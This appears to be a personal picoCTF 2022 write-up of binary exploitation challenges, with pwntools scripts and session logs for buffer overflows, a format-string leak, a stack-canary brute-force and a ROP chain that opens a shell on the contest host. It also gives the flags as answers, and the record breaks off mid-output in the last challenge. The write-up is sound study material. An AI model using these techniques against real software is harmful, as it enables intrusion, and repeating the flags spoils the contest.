# Binary Exploitation

## basic-file-exploit (100 pts)

> The program provided allows you to write to a file and read what you wrote from it. Try playing around with it and see if you can break it!
> Connect to the program with netcat:
> `$ nc saturn.picoctf.net 63612`
> The program's source code with the flag redacted can be downloaded [here](sources/basic-file-exploit.c).

The program stores user input or print selected stored entry. However, the source code indicated that, when you enter a non-integer input for the number of entry to print, it prints the flag out.

```c
static const char* flag = "[REDACTED]";

static void data_read() {
  char entry[4];
  long entry_number;
  char output[100];
  int r;

  memset(output, '\0', 100);
  
  printf("Please enter the entry number of your data:\n");
  r = tgetinput(entry, 4);
  // Timeout on user input
  if(r == -3)
  {
    printf("Goodbye!\n");
    exit(0);
  }
  
  if ((entry_number = strtol(entry, NULL, 10)) == 0) {
    puts(flag);
    fseek(stdin, 0, SEEK_END);
    exit(0);
  }

  entry_number--;
  strncpy(output, data[entry_number], input_lengths[entry_number]);
  puts(output);
}
```

I connected to the program, entered a random entry, and tried to retrieve the flag.

```bash
COMPUTER:/mnt/d/GitHub/picoCTF2022/sources$ nc saturn.picoctf.net 55826
Hi, welcome to my echo chamber!
Type '1' to enter a phrase into our database
Type '2' to echo a phrase in our database
Type '3' to exit the program
1
1
Please enter your data:
hello
hello
Please enter the length of your data:
5
5
Your entry number is: 1
Write successful, would you like to do anything else?
2
2
Please enter the entry number of your data:
a
a
picoCTF{M4K3_5UR3_70_CH3CK_Y0UR_1NPU75_149F090A}
```

Flag: `picoCTF{M4K3_5UR3_70_CH3CK_Y0UR_1NPU75_149F090A}`

## buffer overflow 0 (100 pts)

> Smash the stack
>
> Let's start off simple, can you overflow the correct buffer? The program is available [here](sources/bufferoverflow0). You can view source [here](sources/buffer-overflow-0/buffer-overflow-0.c). And connect with it using:
>
> `nc saturn.picoctf.net 53935`

This was a simple program to exploit.

```bash
COMPUTER:/mnt/d/GitHub/picoCTF2022/sources$ nc saturn.picoctf.net 53935
Input: 22222222222222222222222222222222222222222
picoCTF{ov3rfl0ws_ar3nt_that_bad_a065d5d9}
```

**Flag: `picoCTF{ov3rfl0ws_ar3nt_that_bad_a065d5d9}`**

## CVE-XXXX-XXXX (100 pts)

> Enter the CVE of the vulnerability as the flag with the correct flag format:
> picoCTF{CVE-XXXX-XXXXX} replacing XXXX-XXXXX with the numbers for the matching vulnerability.
> The CVE we're looking for is the first recorded remote code execution (RCE) vulnerability in 2021 in the Windows Print Spooler Service, which is available across desktop and server versions of Windows operating systems. The service is used to manage printers and print servers.

I visited [MITRE CVE](https://cve.mitre.org/) website to search for the vulnerability described above. Since the vulnerability was discovered in 2021, the first 4 X's should be 2021 (`CVE-2021-XXXXX`). My search keyword was `Windows Print Spooler Service RCE`.

A part of the search result is shown below:

|CVE Number       |Description          |
|-----------------|---------------------|
|CVE-2021-36936|Windows Print Spooler Remote Code Execution Vulnerability This CVE ID is unique from CVE-2021-36947, CVE-2021-36958.|
|CVE-2021-34527|Windows Print Spooler Remote Code Execution Vulnerability|
|CVE-2021-34483|Windows Print Spooler Elevation of Privilege Vulnerability|
|CVE-2021-34481|Windows Print Spooler Elevation of Privilege Vulnerability|
|CVE-2021-26878|Windows Print Spooler Elevation of Privilege Vulnerability This CVE ID is unique from CVE-2021-1640.|
|CVE-2021-1695|Windows Print Spooler Elevation of Privilege Vulnerability|
|CVE-2021-1675|Windows Print Spooler Elevation of Privilege Vulnerability|
|CVE-2021-1640|Windows Print Spooler Elevation of Privilege Vulnerability This CVE ID is unique from CVE-2021-26878.|
|CVE-2020-17042|Windows Print Spooler Remote Code Execution Vulnerability|
|CVE-2020-17014|Windows Print Spooler Elevation of Privilege Vulnerability This CVE ID is unique from CVE-2020-17001.|

An entry with a lower number than another is also one that has been discovered before the other. From this list, it appeared that the first WPS RCE vulnerability discovered in 2021 is `CVE-2021-34527`, and it was the flag.

**Flag: `picoCTF{CVE-2021-34527}`**

## buffer overflow 1 (200 pts)

> Control the return address
> 
> Now we're cooking! You can overflow the buffer and return to the flag function in the [program](sources/buffer-overflow-1/vuln).
> 
> You can view source [here](sources/buffer-overflow-1/vuln.c). And connect with it using `nc saturn.picoctf.net 56752`

The program has three functions. `win()` prints out the flag, `vuln()` provides point of exploitation and prints the return address, and the `main()` function accepts input. I used GDB to know more about each function.

```text
COMPUTER:/mnt/d/GitHub/picoCTF2022/sources/buffer-overflow-1$ gdb vuln

(gdb) call win
$1 = {<text variable, no debug info>} 0x80491f6 <win>
(gdb) call main
$2 = {<text variable, no debug info>} 0x80492c4 <main>
(gdb) call vuln
$3 = {<text variable, no debug info>} 0x8049281 <vuln>
(gdb) q
```

Ordinarily, the function ends at `0x804932f`. In order to call `win()` I need to land at `0x80491f6`.

```text
COMPUTER:/mnt/d/GitHub/picoCTF2022/sources/buffer-overflow-1$ nc saturn.picoctf.net 56752
Please enter your string: 
%s
Okay, time to return... Fingers Crossed... Jumping to 0x804932f

COMPUTER:/mnt/d/GitHub/picoCTF2022/sources/buffer-overflow-1$ nc saturn.picoctf.net 56752
Please enter your string: 
12345678901234567890123456789012345678901208  
Okay, time to return... Fingers Crossed... Jumping to 0x8049300
```

The vulnerable function looks like this:

```cpp
#define BUFSIZE 32

// ...

void vuln(){
  char buf[BUFSIZE]; // buf[32]
  gets(buf);

  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
}
```
I tried to test where the return address are stored.

```text
-------------------------------- High Address

--------------------------------

--------------------------------
RET (= 0x080491f6)    [4]
--------------------------------
SFP                   [4]
--------------------------------
buf                   [32] (+8)
--------------------------------
....
-------------------------------- Low Address
```


```text
M:/mnt/d/GitHub/picoCTF2022/sources/buffer-overflow-1$ nc saturn.picoctf.net 56169
Please enter your string: 
1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ
Okay, time to return... Fingers Crossed... Jumping to 0x4c4b4a49
```

`0x4c4b4a49` translates to LKJI. That means the return address space is after 44 letters, and the next 4 letters in reverse is supposed to be return address in ASCII string.

Therefore, the value I need to pass to the return address space is `0xf6 0x91 0x04 0x08`. However, these hex values correspond to non-printable ASCII letters, which means that I cannot enter them manually. Therefore, I wrote a [script](solutions/buffer-overflow-1.py) to pass these bytes:

```python
from pwn import *

s = remote('saturn.picoctf.net', 56752, timeout=5)


recv = s.recvn(26)
print(recv.decode('utf-8'))

dest = b'\xf6\x91\x04\x08\r\n'
payload = b'\x99'*44 + dest

print("Payload:",payload)
s.send(payload)
print("Payload sent")

resp = s.recv(264)
resp = s.recv(264)
resp = s.recv(264)
print("Response:", resp)
```

I ran the script and got the flag.

```text
COMPUTER:/mnt/d/GitHub/picoCTF2022/solutions$ python3 buffer-overflow-1.py 
[+] Opening connection to saturn.picoctf.net on port 56752: Done
Please enter your string: 
Payload: b'\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\xf6\x91\x04\x08\r\n'
Payload sent
Response: b'picoCTF{addr3ss3s_ar3_3asy_ad2f467b}'
[*] Closed connection to saturn.picoctf.net port 56752
```

**Flag: `picoCTF{addr3ss3s_ar3_3asy_ad2f467b}`**

## RPS (200 pts)

> Here's a program that plays rock, paper, scissors against you. I hear something good happens if you win 5 times in a row.
>
> Connect to the program with netcat:
>
> `$ nc saturn.picoctf.net 51420`
>
> The program's source code with the flag redacted can be downloaded [here](sources/rps.c).

This program invites user to a rock, paper, scissors game. The user has to make a move within 60 seconds. The computer will play the game by randomly choosing its move.

```cpp
/* (includes are not described here to save lines) */

#define WAIT 60 // 60 seconds of waiting time

static const char* flag = "[REDACTED]"; // FLAG

char* hands[3] = {"rock", "paper", "scissors"}; // options
char* loses[3] = {"paper", "scissors", "rock"}; // paper > rock, scissors > paper, rock > scissors
int wins = 0;                                   // starts with no win

int tgetinput(char *input, unsigned int l) 
{
    fd_set          input_set;                  // FD set
    struct timeval  timeout;                    // Timeout: 60 seconds
    int             ready_for_reading = 0;      // state for reading input
    int             read_bytes = 0;             // input size (bytes)
    
    if( l <= 0 )
    {
      printf("'l' for tgetinput must be greater than 0\n");
      return -2;
    }
    
    /* Empty the FD Set */
    FD_ZERO(&input_set );
    /* Listen to the input descriptor */
    FD_SET(STDIN_FILENO, &input_set);

    /* Waiting for some seconds (60.00) */
    timeout.tv_sec = WAIT;    // WAIT seconds
    timeout.tv_usec = 0;    // 0 milliseconds

    /* Listening for input stream for any activity */
    ready_for_reading = select(1, &input_set, NULL, NULL, &timeout);
    /* Here, first parameter is number of FDs in the set, 
     * second is our FD set for reading,
     * third is the FD set in which any write activity needs to updated,
     * which is not required in this case. 
     * Fourth is timeout
     */

    if (ready_for_reading == -1) {
        /* Some error has occured in input */
        printf("Unable to read your input\n");
        return -1;
    } 

    if (ready_for_reading) { // Time to read data
        read_bytes = read(0, input, l-1); // read l-1 bytes into input, return how many bytes are read
        if(input[read_bytes-1]=='\n'){ // if last byte is newline  
        --read_bytes; // decrease the count by 1
        input[read_bytes]='\0'; // replace newline with null
        }
        if(read_bytes==0){ // error if no data are given
            printf("No data given.\n");
            return -4;
        } else {
            return 0;
        }
    } else { // After 1 minute of inactivity, end the program.
        printf("Timed out waiting for user input. Press Ctrl-C to disconnect\n");
        return -3;
    }
    return 0;
}

/* Play the game */
bool play () { 
  char player_turn[100]; // 
  srand(time(0));
  int r;

  /* E*/
  printf("Please make your selection (rock/paper/scissors):\n");
  r = tgetinput(player_turn, 100);
  // Timeout on user input
  if(r == -3)
  {
    printf("Goodbye!\n");
    exit(0);
  }

  int computer_turn = rand() % 3; // computer randomly choose
  printf("You played: %s\n", player_turn);
  printf("The computer played: %s\n", hands[computer_turn]);

  // If player beats computer
  if (strstr(player_turn, loses[computer_turn])) {
    puts("You win! Play again?");
    return true;
  } else {
    puts("Seems like you didn't win this time. Play again?");
    return false;
  }

  return 0;
}
```

The game decides who win by checking user's input and find if the winning option is included in the input string, not by comparing if the user input exactly matches the winning option.

```cpp
  if (strstr(player_turn, loses[computer_turn])) {
    puts("You win! Play again?");
    return true;
  } else {
    puts("Seems like you didn't win this time. Play again?");
    return false;
  }
```

There is enough room in `player_turn` variable to enter all three options together. Therefore, the user can win every time by entering `rock paper scissors` over and over again.

```text
Please make your selection (rock/paper/scissors):
rock paper scissors
rock paper scissors
You played: rock paper scissors
The computer played: scissors
You win! Play again?
Congrats, here's the flag!
picoCTF{50M3_3X7R3M3_1UCK_58F0F41B}
Type '1' to play a game
Type '2' to exit the program
```

**Flag: `picoCTF{50M3_3X7R3M3_1UCK_58F0F41B}`**

## x-sixty-what (200 pts)

> Overflow x64 code
>
> Most problems before this are 32-bit x86. Now we'll consider 64-bit x86 which is a little different! Overflow the buffer and change the return address to the `flag` function in this [program](sources/x-sixty-what/vuln). [Download source](sources/x-sixty-what/vuln.c).
>
> `nc saturn.picoctf.net 50776`

The program has three functions.

```text
0000000000401236 <flag>:
  401236:	f3 0f 1e fa          	endbr64 
  40123a:	55                   	push   %rbp
  40123b:	48 89 e5             	mov    %rsp,%rbp
  40123e:	48 83 ec 50          	sub    $0x50,%rsp
....

00000000004012b2 <vuln>:
  4012b2:	f3 0f 1e fa          	endbr64 
  4012b6:	55                   	push   %rbp
  4012b7:	48 89 e5             	mov    %rsp,%rbp
  4012ba:	48 83 ec 40          	sub    $0x40,%rsp
....

00000000004012d2 <main>:
  4012d2:	f3 0f 1e fa          	endbr64 
  4012d6:	55                   	push   %rbp
  4012d7:	48 89 e5             	mov    %rsp,%rbp
  4012da:	48 83 ec 20          	sub    $0x20,%rsp
....
```

The `vuln` function has return address of `401338`. The function is simple.

```cpp
#define BUFFSIZE 64
#define FLAGSIZE 64
...
void vuln(){
  char buf[BUFFSIZE];
  gets(buf);
}
```

The buffer size is 64. If the input exceeds it, segmentation fault occurs.

```text
COMPUTER:/mnt/d/GitHub/picoCTF2022/sources/x-sixty-what$ ./vuln 
Welcome to 64-bit. Give me a string that gets you the flag: 
1111111111222222222233333333334444444444555555555566666666667777
COMPUTER:/mnt/d/GitHub/picoCTF2022/sources/x-sixty-what$ ./vuln 
Welcome to 64-bit. Give me a string that gets you the flag: 
11111111112222222222333333333344444444445555555555666666666677777     
Segmentation fault (core dumped)
```

Since it is a 64-bit program, it means that the sizes of stack frame pointer and return address space are twice those of a 32-bit binary. Therefore, the return address should be placed at 72th byte or further back.

I wrote a [Python script](solutions/x-sixty-what.py) that cracks the code. But when I aimed for the address of `flag()` with 80-byte input ending with the function's address `36 12 40 00 00 00 00 00`, segmentation fault occurred. I looked at the hint for the problem:

> Jump to the second instruction (the one after the first `push`) in the `flag` function, if you're getting mysterious segmentation faults.

This suggested that I need to aim for `0x40123b (mov %rsp,%rbp)` with `3b 12 40 00 00 00 00 00`. I edited my payload and got the flag.

```text
COMPUTER:/mnt/d/GitHub/picoCTF2022/solutions$ python3 x-sixty-what.py 
Buffer size: 72
[+] Opening connection to saturn.picoctf.net on port 50776: Done
[DEBUG] Received 0x3d bytes:
    b'Welcome to 64-bit. Give me a string that gets you the flag: \n'
Welcome to 64-bit. Give me a string that gets you the flag:
[DEBUG] Sent 0x51 bytes:
    00000000  55 55 55 55  55 55 55 55  55 55 55 55  55 55 55 55  │UUUU│UUUU│UUUU│UUUU│
    *
    00000040  55 55 55 55  55 55 55 55  3b 12 40 00  00 00 00 00  │UUUU│UUUU│;·@·│····│
    00000050  0a                                                  │·│
    00000051
[+] Receiving all data: Done (36B)
[DEBUG] Received 0x22 bytes:
    b'picoCTF{b1663r_15_b3773r_11c407bc}'
[*] Closed connection to saturn.picoctf.net port 65505
Response: b' \npicoCTF{b1663r_15_b3773r_11c407bc}'
```

**Flag: `picoCTF{b1663r_15_b3773r_11c407bc}`**

## buffer overflow 2 (300 pts)

> Control the return address and arguments
>
> This time you'll need to control the arguments to the function you return to! Can you get the flag from this [program](sources/buffer-overflow-2/vuln)?
>
> You can view source [here](sources/buffer-overflow-2/vuln.c). And connect with it using `nc saturn.picoctf.net 64246`

The program asks for a string and prints it back to the terminal. It is a 32-bit program. There are three functions.

|Function | Memory address | Arguments |
|---------|----------------|-----------|
|`main`   |`0x08049372`    |`int argc, char **argv` |
|`vuln`   |`0x08049338`    |None |
|`win`    |`0x08049296`    |`unsigned int arg1, unsigned int arg2`|

The `main()` function asks for the string and calls `vuln()`, which puts the input to `buf[100]` and prints it back. 

The `win()` function is different from previous problems in that it takes two arguments and check their values before printing the flag. I have to load these variables as well as the return address.

| Argument | Supposed Value |
|----------|----------------|
| `arg1`   | `0xCAFEF00D`   |
| `arg2`   | `0xF00DF00D`   |

Although `buf` has size of 100, ther So the stack would be like:

```text
-------------------------------- High Address

--------------------------------

--------------------------------
arg2 (= 0xF00DF00D)   [4]
--------------------------------
arg1 (= 0xCAFEF00D)   [4]
--------------------------------
RET  (= 0x08049296)   [4]
--------------------------------
SFP                   [4]
--------------------------------
buf                   [100] (+8)
--------------------------------
....
-------------------------------- Low Address
```

I wrote a [script](solutions/buffer-overflow-2.py) to send the payload. However, I could not find the flag with my original payload. There was a gap between the return address space and the place for arguments.

```text
-------------------------------- High Address

--------------------------------

--------------------------------
arg2 (= 0xF00DF00D)   [4]
--------------------------------
arg1 (= 0xCAFEF00D)   [4]
--------------------------------
          (4 bytes)
--------------------------------
RET  (= 0x08049296)   [4]
--------------------------------
SFP                   [4]
--------------------------------
buf                   [100] (+8)
--------------------------------
....
-------------------------------- Low Address
```

So my payload was like this:

```python
payload = (b'\x43' * 112) + dest + (b'\x43' * 4) + arg1 + arg2 + b'\n'
```

I sent this payload to the program and found the flag.

```text
COMPUTER:/mnt/d/GitHub/picoCTF2022/solutions$ python3 buffer-overflow-2.py
[+] Opening connection to saturn.picoctf.net on port 64246: Done
[+] Receiving all data: Done (163B)
[*] Closed connection to saturn.picoctf.net port 64246
b'CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC\x96\x92\x04\x08CCCC\r\xf0\xfe\xca\r\xf0\r\xf0\npicoCTF{argum3nt5_4_d4yZ_b3fd8f66}'
```

**Flag: `picoCTF{argum3nt5_4_d4yZ_b3fd8f66}`**

## buffer overflow 3 (300 pts)

> Do you think you can bypass the protection and get the flag?
>
> It looks like Dr. Oswal added a stack canary to this [program](sources/buffer-overflow-3/vuln) to protect against buffer overflows. You can view source [here](sources/buffer-overflow-3/vuln.c). And connect with it using:
>
> `nc saturn.picoctf.net 58138`

This time, the program has a canary for stack protection.

|Function | Memory address |
|---------|----------------|
|`main`   |`0x08049588`    |
|`vuln`   |`0x08049461`    |
|`read_canary`   |`0x080493d5`    |
|`win`    |`0x08049336`    |

The canary is stored in `char global_canary[4]` global variable by `read_canary()` function.

The `main()` function reads the 4-byte canary first and starts the `vuln()` function. The `vuln()` function asks for the size of the next input and the actual input:

```text
COMPUTER:/mnt/d/GitHub/picoCTF2022/sources$ nc saturn.picoctf.net 58138
How Many Bytes will You Write Into the Buffer?
> 4
Input> 3333333333333333333333333333333
Ok... Now Where's the Flag?
```

The `vuln()` has five variables:

|Variable  | Size (byte)       | Reading Process   |
|---------|--------------------|-------------------|
|`canary` | 4 (`CANARY_SIZE`)  | `memcpy(canary,global_canary,CANARY_SIZE);` |
|`buf`    | 64 (`BUFSIZE`)     | `read(0,buf,count);` |
|`length` | 64 (`BUFSIZE`)     | `read(0,length+x,1);` |
|`count`  | 4 (int)            | `sscanf(length,"%d",&count);` |
|`x`      | 4 (int)            | `x = 0` (increases until 63 in while loop) |

Although the `buf` variable has a fixed size of 64, the reading function accepts `count` bytes into it. Since `length`, which accepts user input for the value of `count`, can accept 64 digits at maximum, `count` can go over 64. This way, user can cause the overflow.

I tried to crash the program first.

```text
COMPUTER:/mnt/d/GitHub/picoCTF2022/sources$ nc saturn.picoctf.net 58138
How Many Bytes will You Write Into the Buffer?
> 3000
Input> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
***** Stack Smashing Detected ***** : Canary Value Corrupt!
```

In the code, `global_canary` and `read_canary()` are declared between `win()` and `vuln()`. Therefore, the memory address of `global_canary` is between that of `win()` and that of `vuln()`.

```text
-------------------------------- High Address

--------------------------------

--------------------------------

--------------------------------
CANARY @ 0x0804C054   [4]
--------------------------------
....
--------------------------------
RET  (= 0x08049336)   [4]
--------------------------------
SFP                   [4]
--------------------------------
x     [4]
--------------------------------
count [4]
--------------------------------
length          [64] (+8) = 72
--------------------------------
buf             [64] (+8) = 72
--------------------------------
canary           [4] (+8) = 12
--------------------------------
....
-------------------------------- Low Address
```

After some searching, I concluded that the best option is to brute-force the process to find the right canary. Below is the script I wrote to find the canary.

```python
from pwn import *
SMASH = b"Stack Smashing Detected"

def defeat_canary():
    canary = 65
    bits = [1,256,65536,16777216]

    for c_size in range(4): # 0 ~ 3
        msize = str(65 + c_size).encode()
        for runc in range(1,256):
            msg = (b"\x33" * 64) + p32(canary)
            res = delivery(msg, msize)

            if SMASH not in res:
                break
            else:
                canary += bits[c_size]
    
    return canary

x = defeat_canary()
print("========CANARY FOUND========")
print("Canary:", x)
```

It was designed to return the integer that correspond to the little endian version of the canary.

```text
========CANARY FOUND========
Canary: 1683122498  
```

I found the canary, which was `1114198628` or `0x42695264` or `BiRd`.

Using this canary, I wrote [the script](solutions/buffer-overflow-3.py) to find the flag. The address space was 20 bytes after the end of `buf`.

```text
COMPUTER:/mnt/d/GitHub/picoCTF2022/solutions$ python3 buffer-overflow-3.py
[+] Opening connection to saturn.picoctf.net on port 58138: Done
[+] Receiving all data: Done (72B)
[*] Closed connection to saturn.picoctf.net port 58138
b"> Ok... Now Where's the Flag?\npicoCTF{Stat1C_c4n4r13s_4R3_b4D_f9792127}\n"
```

**Flag: `picoCTF{Stat1C_c4n4r13s_4R3_b4D_f9792127}`**

## flag leak (300 pts)

> Story telling class 1/2
>
> I'm just copying and pasting with this [program](sources/flag-leak/vuln). What can go wrong? You can view source [here](sources/flag-leak/vuln.c). And connect with it using:
>
> `nc saturn.picoctf.net 63983`

This program accepts user input and prints it back to the user.

This program has three functions (`main()`, `vuln()`, `readflag()`). But unlike previous problems, the `readflag()` function does not have a line that prints the flag. Instead, it is called by `vuln()` to load the flag to its `char flag[64]` variable. This variable is declared right before the `char story[128]` variable where the user input is stored via `scanf("%127s", story)` function. However, it is printed through the unsafe `printf()` function.

So I thought that a format string attack might be useful.

```text
COMPUTER:/mnt/d/GitHub/picoCTF2022/sources/flag-leak$ nc saturn.picoctf.net 63983
Tell me a story and then I'll tell you one >> ABCDEFGH.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x..%08x.%08x.%08x.                                                       
Here's a story - 
ABCDEFGH.ffc9b140.ffc9b160.08049346.44434241.48474645.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838.2e783830..78383025.3830252e.30252e78.
^C
```

The result showed the values stored in the stack. Each `%08x` revealed 4 bytes of memory. `ABCDEFGH` is stored as `44434241 48474645`, which means the format is little endian. These 8 bytes correspond to the 4th and 5th format strings, meaning that the first 12 bytes of the variable are some metadata.

Since `story` takes 128 bytes, `flag` takes 64 bytes, and both have 12 bytes of metadata before actual data, I needed to grab 192 + 24 = 216 bytes of the memory. Therefore, I needed 54 `%x` format strings.

```text
COMPUTER:/mnt/d/GitHub/picoCTF2022/sources/flag-leak$ nc saturn.picoctf.net 63983
Tell me a story and then I'll tell you one >> %x%x%x.%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x.%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x
Here's a story - 
ffbdef90ffbdefb08049346.78257825252e78252578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782e7825787825782578257825782578257825782578257825782578257825782578257825782578257825f7f1d0008048338f7ee1d20f7d66ab0.6f6369707b4654436b34334c5f676e3167346c466666305f3474535f305f6b63303135357d633238fbad2000931fe000f7f1d990804c00080494100804c000ffbdf078
```

I divided the format strings with `.` for convenience in identifying where `flag` starts. The below is the part that contained the flag and its string equivalent:

```
6f6369707b4654436b34334c5f676e3167346c466666305f3474535f305f6b63303135357d633238
ocip{FTCk43L_gn1g4lFff0_4tS_0_kc0155}c28
```

I recovered the flag by flipping every 4 characters. I wrote the [script](solutions/flag-leak.py) for it:

```python
recovered_flag = "ocip{FTCk43L_gn1g4lFff0_4tS_0_kc0155}c28" # 40 chars

real_flag = ""
block = ""

for l in recovered_flag:
    block = l + block
    if len(block) == 4:
        real_flag += block
        block = ""

print(real_flag)
```

**Flag: `picoCTF{L34k1ng_Fl4g_0ff_St4ck_0551082c}`**

## ropfu (300 pts)

> What's ROP?
>
> Can you exploit the following [program](sources/ropfu/vuln) to get the flag? [Download source](sources/ropfu/vuln.c).
>
> `nc saturn.picoctf.net 56031`

The goal of this problem is to exploit the program with [Return-Oriented Programming (ROP)](https://secureteam.co.uk/articles/how-return-oriented-programming-exploits-work/).

When I connected to the program, it showed this message before accepting input:

```text
M:~$ nc saturn.picoctf.net 56031
How strong is your ROP-fu? Snatch the shell from my hand, grasshopper!
```

In the beginning, I tried to execute a shellcode by overflowing the buffer and changing the return address to the start of the shellcode, but the stack was not executable. Therefore I resorted to invoking `syscall` to execute `execve("/bin/sh", 0, 0)`.

I searched for ROP gadgets in the code and found some useful lines of code.

```text
; Set up eax, ebx and edx
 80583c8:	58                   	pop    %eax
 80583c9:	5a                   	pop    %edx
 80583ca:	5b                   	pop    %ebx
 80583cb:	c3                   	ret    

; Set up ecx
08049e39 <gadget1>:
 8049e39:	59                   	pop    %ecx
 8049e3a:	c3                   	ret    
 
; Write to the executable parts of memory
 8059102:	89 02                	mov    %eax,(%edx)
 8059104:	c3                   	ret    

; Interrupt 0x80
08071650 <_dl_sysinfo_int80>:
 8071650:	cd 80                	int    $0x80
 8071652:	c3                   	ret    
```

Given the gadgets above, I used these registers like this:

|Stage |EAX|EBX|ECX|EDX|
|------|---|---|---|---|
|1 |`"/bin"` |Memory at `.bss`|None|Memory at `.bss`|
|2 |`"//sh"` |Memory at `.bss`|None|Memory at `.bss` + 4|
|3 |Memory at `.bss` |Memory at `.bss`|None|Memory at `.bss` + 12|
|3 |11 (`0x0b`), syscall code for `execve()` |Memory at `.bss`|`NULL`|`NULL`|

Utilizing what I found, I wrote an [exploit script](solutions/ropfu.py) that opens the shell.

```text
COMPUTER:/mnt/d/GitHub/picoCTF2022/solutions$ python3 ropfu.py
b'How strong is your ROP-fu? Snatch the shell from my hand, grasshopper!\n'
ls -all
b'total 700\ndrwxr-xr-x 1 root root     34 Mar 15 06:45 .\ndrwxr-xr-x 1 root root    104 Mar 15 06:45 ..\n-rw-r--r-- 1 root root     34 Mar 15 06:45 flag.txt\n-rwxr-xr-x 1 root root 709360 Mar 15 06:45 vuln\n'
cat flag.txt
b'picoCTF{5n47ch_7h3_5h311_e81af635}'
exit
b''
```

**Flag: `picoCTF{5n47ch_7h3_5h311_e81af635}`**

## wine (300 pts)

> Challenge best paired with wine.
>
> I love windows. Checkout my exe running on a linux box. You can view source [here](sources/wine/vuln.c). And connect with it using `nc saturn.picoctf.net 62481`

(NOTE: Due to the exe file being classified as a virus by Windows Defender, I will not link it here.)

The file asks for a string. The source code indicates that the buffer that receives the string is 128 bytes long. When I entered string that exceeds this length, it returned this error message:

```text
Give me a string!
BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
Unhandled exception: page fault on read access to 0x42424242 in 32-bit code (0x42424242).
Register dump:
 CS:0023 SS:002b DS:002b ES:002b FS:006b GS:0063
 EIP:42424242 ESP:0064fe80 EBP:42424242 EFLAGS:00010246(  R- --  I  Z- -P- )
 EAX:0064fdf0 EBX:00230e78 ECX:0064fde0 EDX:7fec48d8
 ESI:00000005 EDI:006d2250
Stack dump:
0x0064fe80:  42424242 42424242 42424242 42424242
0x0064fe90:  42424242 42424242 42424242 42424242
0x0064fea0:  42424242 42424242 42424242 42424242
0x0064feb0:  42424242 42424242 42424242 42424242
0x0064fec0:  42424242 42424242 42424242 42424242
0x0064fed0:  42424242 00000000 00000000 00000000
Backtrace:
=>0 0x42424242 (0x42424242)
0x42424242: -- no code accessible --
Modules:
Module  Address                 Debug info      Name (5 modules)
PE        400000-  44b000       Deferred        vuln
PE      7b020000-7b023000       Deferred        kernelbase
PE      7b420000-7b5db000       Deferred        kernel32
PE      7bc30000-7bc34000       Deferred        ntdll
PE      7fe10000-7fe14000       Deferred        msvcrt
Threads:
process  tid      prio (all id:s are in hex)
00000008 (D) Z:\challenge\vuln.exe
        00000009    0 <==
0000000e services.exe
        00000024    0
        00000015    0
        00000010    0
        0000000f    0
00000011 plugplay.exe
        00000019    0
        00000018    0
        00000012    0
00000022 winedevice.exe
        00000028    0
        00000027    0
        00000023    0
0000002d explorer.exe
        0000002f    0
        0000002e    0
System information:
    Wine build: wine-5.0 (Ubuntu 5.0-3ubuntu1)
    Platform: i386
    Version: Windows 7
    Host system: Linux
    Host version: 5.13.0-1017-aws
```

The source code contains three functions: `main`, `vuln`, and `win`. I needed to return the address for `win`, which was `0x00401530`. I wrote a [script](solutions/wine.py) to attack this program. But I thought that I need to fill only 136 bytes before the return address, and I came up 4 bytes short.

```text
COMPUTER:/mnt/d/GitHub/picoCTF2022/solutions$ python3 wine.py
[+] Opening connection to saturn.picoctf.net on port 62481: Done
b'Give me a string!\r\n'
[+] Receiving all data: Done (1.45KB)
[*] Closed connection to saturn.picoctf.net port 62481
b'Unhandled exception: page fault on write access to 0x724d21e4 in 32-bit code (0x00401602).\nRegister dump:\n 
